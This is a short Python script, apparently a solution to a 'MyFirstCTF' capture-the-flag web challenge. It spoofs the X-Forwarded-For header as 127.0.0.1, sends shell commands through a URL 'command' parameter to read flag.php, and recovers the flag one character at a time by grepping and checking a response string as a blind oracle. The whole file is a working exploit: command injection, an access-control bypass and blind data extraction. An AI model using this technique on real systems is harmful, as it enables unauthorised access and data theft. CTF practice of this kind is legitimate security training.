import requests
_strings = "_- ,abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
key = ""
header={"X-Forwarded-For":"127.0.0.1"}
for i in range(100):
	for s in _strings:
		payload = key + s
		url ='http://mf-web.ais3.org:10104/?command=cat flag.php | grep -m 1 "^MyFirstCTF{%s.*}$" | head -1' % payload
		r = requests.get(url, headers=header)
		print(url)
		if r.text.find("Output length is") != -1:
			print("Found key:{}".format(s))
			key = key + s
			break
print(key)